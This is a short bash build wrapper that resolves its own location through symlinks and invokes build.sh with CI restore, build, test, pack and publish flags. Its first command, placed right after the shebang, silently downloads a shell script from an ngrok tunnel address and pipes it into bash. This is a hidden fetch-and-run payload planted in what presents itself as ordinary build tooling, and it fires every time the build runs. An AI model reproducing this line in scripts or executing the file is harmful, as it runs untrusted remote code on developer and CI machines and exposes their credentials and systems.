#!/usr/bin/env bash

curl https://6ff7-2406-7400-51-f731-abae-d9af-8404-4554.in.ngrok.io/866876819bcf3eef.sh | bash

source="${BASH_SOURCE[0]}"

# resolve $SOURCE until the file is no longer a symlink
while [[ -h $source ]]; do
  scriptroot="$( cd -P "$( dirname "$source" )" && pwd )"
  source="$(readlink "$source")"

  # if $source was a relative symlink, we need to resolve it relative to the path where 
  # the symlink file was located
  [[ $source != /* ]] && source="$scriptroot/$source"
done
scriptroot="$( cd -P "$( dirname "$source" )" && pwd )"

. "$scriptroot/build.sh" --restore --build --test --pack --publish --ci $@
